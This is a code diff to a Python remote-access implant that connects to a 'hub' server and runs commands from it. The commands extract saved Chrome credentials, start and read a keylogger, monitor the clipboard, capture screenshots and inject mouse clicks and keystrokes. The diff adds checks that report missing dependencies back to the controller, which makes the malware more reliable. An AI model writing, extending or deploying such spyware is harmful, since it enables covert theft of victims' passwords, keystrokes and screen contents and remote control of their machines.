@@ -195,8 +195,7 @@ def stop_clipboard_monitor():
 def capture_desktop_screenshot(client: socket.socket) -> None:
     """Capture primary monitor and send as PNG byte stream to server."""
     if not MSS_AVAILABLE or not PIL_AVAILABLE:
-        error_msg = json.dumps({'error': 'mss or PIL not installed'})
-        client.send(f"DESKTOP_SIZE {len(error_msg)}\n".encode())
+        error_msg = "DEPENDENCY_MISSING: mss Pillow\n"
         client.sendall(error_msg.encode())
         print("[!] Desktop capture failed: mss or PIL not available")
         return
@@ -548,6 +547,9 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
                         except Exception as e:
                             print(f"[-] HARVEST_USER failed: {e}")
                     elif command == 'EXTRACT_CREDENTIALS':
+                        if not SQLITE_AVAILABLE or not CRYPTO_AVAILABLE:
+                            client.sendall(b"DEPENDENCY_MISSING: sqlite3 pycryptodome\n")
+                            continue
                         try:
                             creds = extract_chrome_credentials()
                             client.send(f"CRED_SIZE {len(creds)}\n".encode())
@@ -557,6 +559,9 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
                             client.send(f"CRED_SIZE {len(error_msg)}\n".encode())
                             client.sendall(error_msg.encode())
                     elif command == 'KEYLOG':
+                        if not PYNPUT_AVAILABLE:
+                            client.sendall(b"DEPENDENCY_MISSING: pynput\n")
+                            continue
                         if 'START' in command.upper():
                             result = start_keylogger()
                         elif 'STOP' in command.upper():
@@ -565,6 +570,9 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
                             result = "Use KEYLOG START or KEYLOG STOP"
                         client.sendall(f"KEYLOG_RESULT: {result}\n".encode())
                     elif command == 'GET_KEYS':
+                        if not PYNPUT_AVAILABLE:
+                            client.sendall(b"DEPENDENCY_MISSING: pynput\n")
+                            continue
                         try:
                             log_data = get_keylog()
                             client.send(f"KEYLOG_SIZE {len(log_data)}\n".encode())
@@ -574,6 +582,9 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
                             client.send(f"KEYLOG_SIZE {len(error_msg)}\n".encode())
                             client.sendall(error_msg.encode())
                     elif command == 'CLIPBOARD':
+                        if not PYPERCLIP_AVAILABLE:
+                            client.sendall(b"DEPENDENCY_MISSING: pyperclip\n")
+                            continue
                         if 'START' in command.upper():
                             result = start_clipboard_monitor()
                         elif 'STOP' in command.upper():
@@ -583,7 +594,7 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
                         client.sendall(f"CLIPBOARD_RESULT: {result}\n".encode())
                     elif command.startswith('CLICK '):
                         if not PYAUTOGUI_AVAILABLE:
-                            print("[!] pyautogui not available")
+                            client.sendall(b"DEPENDENCY_MISSING: pyautogui\n")
                             continue
                         try:
                             parts = command.split()
@@ -595,7 +606,7 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
                             print(f"[!] Invalid CLICK command or failed: {e}")
                     elif command.startswith('TYPE '):
                         if not PYAUTOGUI_AVAILABLE:
-                            print("[!] pyautogui not available")
+                            client.sendall(b"DEPENDENCY_MISSING: pyautogui\n")
                             continue
                         try:
                             text = command[5:].strip('"')
